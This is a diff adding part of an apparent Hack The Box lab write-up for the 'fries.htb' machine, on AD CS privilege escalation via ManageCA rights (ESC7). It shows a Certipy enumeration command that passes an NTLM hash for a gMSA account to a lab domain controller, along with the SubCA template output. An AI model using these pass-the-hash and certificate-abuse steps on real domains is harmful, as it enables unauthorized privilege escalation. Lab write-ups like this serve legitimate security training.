@@ -1030,7 +1030,46 @@ I also have ManageCa rights, which means i should be able to add myself as an en
 
 https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca
 
+```python
+certipy-ad find -u 'gMSA_CA_prod$@fries.htb' -hashes ':1be70aa7a632cd28036169c6038a92a5' -dc-host dc01.fries.htb -dc-ip 10.129.244.72 -stdout -enabled
 
+3
+    Template Name                       : SubCA
+    Display Name                        : Subordinate Certification Authority
+    Certificate Authorities             : fries-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : True
+    Any Purpose                         : True
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Private Key Flag                    : ExportableKey
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 1
+    Validity Period                     : 5 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2025-05-19T14:10:46+00:00
+    Template Last Modified              : 2025-05-19T14:10:46+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : FRIES.HTB\Domain Admins
+                                          FRIES.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : FRIES.HTB\Enterprise Admins
+        Full Control Principals         : FRIES.HTB\Domain Admins
+                                          FRIES.HTB\Enterprise Admins
+        Write Owner Principals          : FRIES.HTB\Domain Admins
+                                          FRIES.HTB\Enterprise Admins
+        Write Dacl Principals           : FRIES.HTB\Domain Admins
+                                          FRIES.HTB\Enterprise Admins
+        Write Property Enroll           : FRIES.HTB\Domain Admins
+                                          FRIES.HTB\Enterprise Admins
+```
+
+So the templat recommended in the certipy is also enabeld
 
 
 
